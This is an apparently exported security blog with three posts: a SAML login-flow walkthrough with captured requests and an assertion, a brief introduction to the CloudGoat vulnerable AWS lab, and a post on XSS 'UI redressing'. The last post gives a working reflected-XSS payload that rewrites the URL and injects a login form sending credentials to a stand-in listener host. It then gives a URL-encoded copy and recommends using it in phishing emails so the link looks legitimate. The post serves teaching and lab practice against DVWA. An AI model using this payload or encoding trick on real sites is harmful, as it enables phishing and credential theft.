it is very helpful. Response: Welcome to the IDP, go here and fill this form out IDP responds with a 302 to a login page the redirect also includes auth information\nHTTP/1.1 302 Found\rDate: Fri, 26 Jun 2020 16:01:21 GMT\rServer: Apache/2.4.18 (Ubuntu)\rSet-Cookie: PHPSESSID=1b1500050c1336f7bf7932336ccc957f; path=/; HttpOnly\rExpires: Thu, 19 Nov 1981 08:52:00 GMT\rCache-Control: no-cache, must-revalidate\rPragma: no-cache\rLocation: http://idp.jellystone.com/simplesamlphp/module.php/core/loginuserpass.php?AuthState=_a87e532c1d8e81a590e643b9a38caba90d77c86a31%3Ahttp%3A%2F%2Fidp.jellystone.com%2Fsimplesamlphp%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttp%253A%252F%252Fyogivulnerablesaml.jellystone.com%253A8000%252Fmetadata%252F%26cookieTime%3D1593187281%26RelayState%3Dhttp%253A%252F%252Fyogivulnerablesaml.jellystone.com%253A8000%252Fprofile%252F\rContent-Length: 1267\rConnection: close\rContent-Type: text/html; charset=UTF-8 Request: Here is my username and password Post request to the IDP\nPOST /simplesamlphp/module.php/core/loginuserpass.php? HTTP/1.1\rHost: idp.jellystone.com\rUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rReferer: http://idp.jellystone.com/simplesamlphp/module.php/core/loginuserpass.php?AuthState=_a87e532c1d8e81a590e643b9a38caba90d77c86a31%3Ahttp%3A%2F%2Fidp.jellystone.com%2Fsimplesamlphp%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttp%253A%252F%252Fyogivulnerablesaml.jellystone.com%253A8000%252Fmetadata%252F%26cookieTime%3D1593187281%26RelayState%3Dhttp%253A%252F%252Fyogivulnerablesaml.jellystone.com%253A8000%252Fprofile%252F\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 328\rConnection: close\rCookie: PHPSESSID=1b1500050c1336f7bf7932336ccc957f\rUpgrade-Insecure-Requests: 1\rusername=yogi\u0026amp;password=bear\u0026amp;AuthState=_a87e532c1d8e81a590e643b9a38caba90d77c86a31%3Ahttp%3A%2F%2Fidp.jellystone.com%2Fsimplesamlphp%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttp%253A%252F%252Fyogivulnerablesaml.jellystone.com%253A8000%252Fmetadata%252F%26cookieTime%3D1593187281%26RelayState%3Dhttp%253A%252F%252Fyogivulnerablesaml.jellystone.com%253A8000%252Fprofile%252F The IDP responds with a 200 OK and executes javascript to make post request to the Service Provider with the assertion payload. The post request to the Service provider is below:\nRequest: I\u0026rsquo;m back and I am who I say I am, here is my proof POST /?acs HTTP/1.1\rHost: yogivulnerablesaml.jellystone.com:8000\rUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate\rReferer: http://idp.jellystone.com/simplesamlphp/module.php/core/loginuserpass.php?\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 10153\rConnection: close\rUpgrade-Insecure-Requests: 1\rSAMLResponse=PHNhbWxwOlJlc...truncated based 64 blob...\u0026amp;RelayState=http%3A%2F%2Fyogivulnerablesaml.jellystone.com%3A8000%2Fprofile%2F Whats in the truncated based64 blob? Its our assertion payload that contains the signing information, the identity information, and metadata about the message. There are sever parts to it but for this write up we care about the Signature portion, and the Assertion portion. WHen we decode the blob we are presented with xml data. Lets take a look at the message. For the next few sections I\u0026rsquo;ve broken up the entire message into smaller chunks for readability\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;samlp:Response Destination=\u0026#34;http://yogivulnerablesaml.jellystone.com:8000/?acs\u0026#34; ID=\u0026#34;_680413d1f1dbb580a36385e5f6bcb985d5bb2404bd\u0026#34; InResponseTo=\u0026#34;ONELOGIN_23c52cd80a12e293be2a4fdd29a6362d2b43878e\u0026#34; IssueInstant=\u0026#34;2020-06-26T16:01:31Z\u0026#34; Version=\u0026#34;2.0\u0026#34; xmlns:saml=\u0026#34;urn:oasis:names:tc:SAML:2.0:assertion\u0026#34; xmlns:samlp=\u0026#34;urn:oasis:names:tc:SAML:2.0:protocol\u0026#34;\u0026gt; \u0026lt;saml:Issuer\u0026gt; http://idp.jellystone.com/simplesamlphp/saml2/idp/metadata.php \u0026lt;/saml:Issuer\u0026gt; The section below contains signature information\n\u0026lt;ds:Signature xmlns:ds=\u0026#34;http://w3.org/...\u0026#34;\u0026gt; \u0026lt;ds:SignedInfo\u0026gt; \u0026lt;ds:CanonicalizationMethod Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:SignatureMethod Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:Reference URI=\u0026#34;#_680413d1f1dbb580a36385e5f6bcb985d5bb2404bd\u0026#34;\u0026gt; \u0026lt;ds:Transforms\u0026gt; \u0026lt;ds:Transform Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:Transform Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;/ds:Transforms\u0026gt; \u0026lt;ds:DigestMethod Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:DigestValue\u0026gt;LDuhdC47bWPLtaWR+DifMF5Ad/s=\u0026lt;/ds:DigestValue\u0026gt; \u0026lt;/ds:Reference\u0026gt; \u0026lt;/ds:SignedInfo\u0026gt; \u0026lt;ds:SignatureValue\u0026gt;truncated=\u0026lt;/ds:SignatureValue\u0026gt; \u0026lt;ds:KeyInfo\u0026gt; \u0026lt;ds:X509Data\u0026gt; \u0026lt;ds:X509Certificate\u0026gt;certificate bits\u0026lt;/ds:X509Certificate\u0026gt; \u0026lt;/ds:X509Data\u0026gt; \u0026lt;/ds:KeyInfo\u0026gt; \u0026lt;/ds:Signature\u0026gt; \u0026lt;samlp:Status\u0026gt; \u0026lt;samlp:StatusCode Value=\u0026#34;urn:oasis:names:tc:SAML:2.0:status:Success\u0026#34;/\u0026gt; \u0026lt;/samlp:Status\u0026gt; \u0026lt;saml:Assertion ID=\u0026#34;_59c561cc8e12b4cfab5c0f2d1d55ce541028d3342a\u0026#34; IssueInstant=\u0026#34;2020-06-26T16:01:31Z\u0026#34; Version=\u0026#34;2.0\u0026#34; xmlns:xs=\u0026#34;http://w3.org/...\u0026#34; xmlns:xsi=\u0026#34;http://w3.org/...\u0026#34;\u0026gt; \u0026lt;saml:Issuer\u0026gt; http://idp.jellystone.com/simplesamlphp/saml2/idp/metadata.php \u0026lt;/saml:Issuer\u0026gt; \u0026lt;ds:Signature xmlns:ds=\u0026#34;http://w3.org/...\u0026#34;\u0026gt; \u0026lt;ds:SignedInfo\u0026gt; \u0026lt;ds:CanonicalizationMethod Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:SignatureMethod Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:Reference URI=\u0026#34;#_59c561cc8e12b4cfab5c0f2d1d55ce541028d3342a\u0026#34;\u0026gt; \u0026lt;ds:Transforms\u0026gt; \u0026lt;ds:Transform Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:Transform Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;/ds:Transforms\u0026gt; \u0026lt;ds:DigestMethod Algorithm=\u0026#34;http://w3.org/...\u0026#34;/\u0026gt; \u0026lt;ds:DigestValue\u0026gt;cSXkNHBuvGm64eH1ldvgm8n1ArY=\u0026lt;/ds:DigestValue\u0026gt; \u0026lt;/ds:Reference\u0026gt; \u0026lt;/ds:SignedInfo\u0026gt; \u0026lt;ds:SignatureValue\u0026gt;signature bits\u0026lt;/ds:SignatureValue\u0026gt; \u0026lt;ds:KeyInfo\u0026gt; \u0026lt;ds:X509Data\u0026gt; \u0026lt;ds:X509Certificate\u0026gt;certificate bits\u0026lt;/ds:X509Certificate\u0026gt; \u0026lt;/ds:X509Data\u0026gt; \u0026lt;/ds:KeyInfo\u0026gt; \u0026lt;/ds:Signature\u0026gt; The last section includes all of the attributes about the subject, group memberships, etc.\n\u0026lt;saml:Subject\u0026gt; \u0026lt;saml:NameID Format=\u0026#34;urn:oasis:names:tc:SAML:2.0:nameid-format:transient\u0026#34; SPNameQualifier=\u0026#34;http://yogivulnerablesaml.jellystone.com:8000/metadata/\u0026#34;\u0026gt;_77a94f4b52ba9f7fd80ac091a8c561136b697837d2 \u0026lt;/saml:NameID\u0026gt; \u0026lt;saml:SubjectConfirmation Method=\u0026#34;urn:oasis:names:tc:SAML:2.0:cm:bearer\u0026#34;\u0026gt; \u0026lt;saml:SubjectConfirmationData InResponseTo=\u0026#34;ONELOGIN_23c52cd80a12e293be2a4fdd29a6362d2b43878e\u0026#34; NotOnOrAfter=\u0026#34;2020-06-26T16:06:31Z\u0026#34; Recipient=\u0026#34;http://yogivulnerablesaml.jellystone.com:8000/?acs\u0026#34;/\u0026gt; \u0026lt;/saml:SubjectConfirmation\u0026gt; \u0026lt;/saml:Subject\u0026gt; \u0026lt;saml:Conditions NotBefore=\u0026#34;2020-06-26T16:01:01Z\u0026#34; NotOnOrAfter=\u0026#34;2020-06-26T16:06:31Z\u0026#34;\u0026gt; \u0026lt;saml:AudienceRestriction\u0026gt; \u0026lt;saml:Audience\u0026gt;http://yogivulnerablesaml.jellystone.com:8000/metadata/\u0026lt;/saml:Audience\u0026gt; \u0026lt;/saml:AudienceRestriction\u0026gt; \u0026lt;/saml:Conditions\u0026gt; \u0026lt;saml:AuthnStatement AuthnInstant=\u0026#34;2020-06-26T16:01:31Z\u0026#34; SessionIndex=\u0026#34;_f2d9382c86855d907f7462337c2a0716cdeae5fde5\u0026#34; SessionNotOnOrAfter=\u0026#34;2020-06-27T00:01:31Z\u0026#34;\u0026gt; \u0026lt;saml:AuthnContext\u0026gt; \u0026lt;saml:AuthnContextClassRef\u0026gt; urn:oasis:names:tc:SAML:2.0:ac:classes:Password\u0026lt;/saml:AuthnContextClassRef\u0026gt; \u0026lt;/saml:AuthnContext\u0026gt; \u0026lt;/saml:AuthnStatement\u0026gt; \u0026lt;saml:AttributeStatement\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;memberOf\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:uri\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt; users \u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;firstName\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:uri\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt; Yogi \u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;lastName\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:uri\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt; Bear \u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;username\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:uri\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt; yogi \u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;saml:Attribute Name=\u0026#34;urn:oid:1.2.840.113549.1.9.1\u0026#34; NameFormat=\u0026#34;urn:oasis:names:tc:SAML:2.0:attrname-format:uri\u0026#34;\u0026gt; \u0026lt;saml:AttributeValue xsi:type=\u0026#34;xs:string\u0026#34;\u0026gt; yogi@jellystonep.com \u0026lt;/saml:AttributeValue\u0026gt; \u0026lt;/saml:Attribute\u0026gt; \u0026lt;/saml:AttributeStatement\u0026gt; \u0026lt;/saml:Assertion\u0026gt; \u0026lt;/samlp:Response\u0026gt; At this point the service provider should validate the message, and confirm that the user (Subject) that is requesting access is authorized to access resources within the application. If they are provie them with a 302 redirect to some page within the application now that they are authorized.\nReferences Great References:\nRFC7522 SAML Overview of SAML Authentication vs Authorization Bypassing SAML 2.0 SSO with XML Signature Attracks Duo Finds SAML Vulnerabilities Affecting Multiple Implementations ","permalink":"https://jellyparks.com/posts/saml-overview/","summary":"Let\u0026rsquo;s dig into what SAML is, and how it works.","title":"saml_overview"},{"content":" First CloudGoat was created by the RhinoSecurity Group.\nWhat is CloudGoat? According to the github repo \u0026ldquo;CloudGoat is Rhino Security Labs\u0026rsquo; \u0026ldquo;Vulnerable by Design\u0026rdquo; AWS deployment tool.\u0026rdquo;\nCloudGoat is a collection of terraform configuration files that when deployed create very specific, and very vulnerable aws environments.\nThe documentation in the repository walks through the setup process.\nThis tool removes the complexity of having to setup an environment. More importantly it provides and opportunity to blindly (mostly) work through the enumeration portion of an assessment\nWhen finished with a scenerio you simply issue the destroy command and the entire environment is removed.\n","permalink":"https://jellyparks.com/posts/what-is-cloudgoat/","summary":"Cloud Goat CTF Overview","title":"what_is_cloudgoat"},{"content":" Moving Beyond alert(\u0026lsquo;xss\u0026rsquo;) Most people know all about making an alert box pop or getting a cookie sent to an external site with document.cookie. It makes since, it is easy to demo and for the most part makes for a great proof of concept.\nUnfortunately these sometimes fail to showcase some of the more potentially devious outcomes from having a site that is vulnerable to XSS.\nI recently came across a form of XSS that is called ui redressing. As I researched and learned more about it I came to see how malicious a XSS attack could be.\nWhat is UI Redressing? Redressing leverages features of html5 to call the history.replaceState or history.pushState functions to the browser. These functions allow a script to re-write what is presented in the URL bar after a page has loaded.\nA script, rewrites the url presented in the address bar after loading the page. I\u0026rsquo;ll let that sink in for a minute. I first came across this method randomly on swisskeyrepo/PayloadsAllTheThings xss injection GitHub page.\nFrom the example on the swisskyrepo\u0026rsquo;s page history.replaceState() is leveraged to replace the page with a /login.\nNote: history.pushState() could also be used.\nWhen the script is ran the url bar will be re-written from:\nhttp://dvwa/vulnerabilities/xss_r/?name=yogi# to something a bit more devious:\nhttp://dvwa/login So what? Whats the big deal, the url is re-written but the page is still the page it should be. Right? Maybe, unless the page gets changed with the document.body.innerHTML property\u0026hellip;.\nIn Practice Up until this point we have seen how UI redressing can be used to change the address bar. Let\u0026rsquo;s leverage that and also re-write the html page to something a little bit more fitting of a login url. Using the script below we can change the URL to http://dvwa/login and also create a new html page for it with document.body.innerHTML.\n\u0026lt;script\u0026gt; history.replaceState(null, null, \u0026#39;../../../login\u0026#39;); document.body.innerHTML = \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Please login to acces s secure portion of our site.\u0026lt;/h2\u0026gt;\u0026lt;form action=\u0026#39;http://SomeMaliciousListener\u0026#39;\u0026gt;Usernam e: \u0026lt;input type=\u0026#39;text\u0026#39;\u0026gt;Password: \u0026lt;input type=\u0026#39;password\u0026#39;\u0026gt;\u0026lt;input value=\u0026#39;submit\u0026#39; type=\u0026#39;su bmit\u0026#39;\u0026gt;\u0026lt;/form\u0026gt;\u0026#34; \u0026lt;/script\u0026gt; That\u0026rsquo;s it. We can send a Phishing email with a url that is vulnerable to a reflected XSS and include that code as our payload.\nhttp://dvwa/vulnerabilities/xss_r/?name=\u0026lt;script\u0026gt;history.replaceState(null, null, \u0026#39;../../../login\u0026#39;);document.body.innerHTML = \u0026#34;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;/br\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2\u0026gt;Please login to access secure portion of our site.\u0026lt;/h2\u0026gt;\u0026lt;form action=\u0026#39;http://SomeMaliciousListener\u0026#39;\u0026gt;Username: \u0026lt;input type=\u0026#39;text\u0026#39;\u0026gt;Password: \u0026lt;input type=\u0026#39;password\u0026#39;\u0026gt;\u0026lt;input value=\u0026#39;submit\u0026#39; type=\u0026#39;submit\u0026#39;\u0026gt;\u0026lt;/form\u0026gt;\u0026#34;\u0026lt;/script\u0026gt; Even though the page that is expected to load looks similar to this:\nWhen the victim clicks the link the login page below will load:\nWhat about site certificates? It is not a problem. The victim is still on the real site. They are just at a destination that does not really exist except for them.\nWont they notice something weird about the url? Perhaps, I do not recommend sending a url that is full of html and javascript code. URL encoding it to something like this is much more favorable.\nhttp://dvwa/vulnerabilities/xss_r/?name=%3c%73%63%72%69%70%74%3e%68%69%73%74%6f%72%79%2e%72%65%70%6c%61%63%65%53%74%61%74%65%28%6e%75%6c%6c%2c%20%6e%75%6c%6c%2c%20%27%2e%2e%2f%2e%2e%2f%2e%2e%2f%6c%6f%67%69%6e%27%29%3b%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%20%3d%20%22%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%2f%62%72%3e%3c%63%65%6e%74%65%72%3e%3c%68%32%3e%50%6c%65%61%73%65%20%6c%6f%67%69%6e%20%74%6f%20%61%63%63%65%73%73%20%73%65%63%75%72%65%20%70%6f%72%74%69%6f%6e%20%6f%66%20%6f%75%72%20%73%69%74%65%2e%3c%2f%68%32%3e%3c%66%6f%72%6d%20%61%63%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%53%6f%6d%65%4d%61%6c%69%63%69%6f%75%73%4c%69%73%74%65%6e%65%72%27%3e%55%73%65%72%6e%61%6d%65%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%27%74%65%78%74%27%3e%50%61%73%73%77%6f%72%64%3a%20%3c%69%6e%70%75%74%20%74%79%70%65%3d%27%70%61%73%73%77%6f%72%64%27%3e%3c%69%6e%70%75%74%20%76%61%6c%75%65%3d%27%73%75%62%6d%69%74%27%20%74%79%70%65%3d%27%73%75%62%6d%69%74%27%3e%3c%2f%66%6f%72%6d%3e%22%3c%2f%73%63%72%69%70%74%3e This url looks much more \u0026lsquo;official\u0026rsquo;. I imagine most people would see this url and think: \u0026ldquo;oh, just your typical super long url, much be official. Let me check my training. Yup goes to the domain I expect, yup certificate is valid, must be a real site. Safe to login.\u0026rdquo; I think that the long url lends itself towards being perceived as more legitimate.\n","permalink":"https://jellyparks.com/posts/xss-ui-redressing/","summary":"Moving beyond document.cookie xss and rewriting the entire browser window","title":"xss_ui_redressing"}]